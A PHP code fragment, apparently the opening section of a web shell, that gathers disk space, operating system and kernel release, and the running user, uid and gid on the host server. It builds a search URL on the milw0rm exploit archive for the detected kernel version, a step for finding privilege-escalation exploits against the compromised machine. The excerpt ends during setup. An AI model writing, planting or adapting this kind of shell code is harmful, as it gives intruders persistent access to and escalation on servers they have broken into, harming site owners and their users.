<?php 
    $freeSpace = @diskfreespace($GLOBALS['cwd']); 
    $totalSpace = @disk_total_space($GLOBALS['cwd']); 
    $totalSpace = $totalSpace?$totalSpace:1; 
    $release = @php_uname('r'); 
    $kernel = @php_uname('s'); 
    $millink='http://milw0rm.com/search.php?dong='; 
    if( strpos('Linux', $kernel) !== false ) 
        $millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) ); 
    else 
        $millink .= urlencode( $kernel . ' ' . substr($release,0,3) ); 
    if(!function_exists('posix_getegid')) { 
        $user = @get_current_user(); 
        $uid = @getmyuid(); 
        $gid = @getmygid(); 
        $group = "?"; 
    } else { 
        $uid = @posix_getpwuid(@posix_geteuid()); 
        $gid = @posix_getgrgid(@posix_getegid()); 
        $user = $uid['name']; 
        $uid = $uid['uid']; 
        $group = $gid['name']; 
        $gid = $gid['gid']; 
    } 
    $cwd_links = ''; 
    $path = explode("/", $GLOBALS['cwd']); 
    $n=count($path); 
?>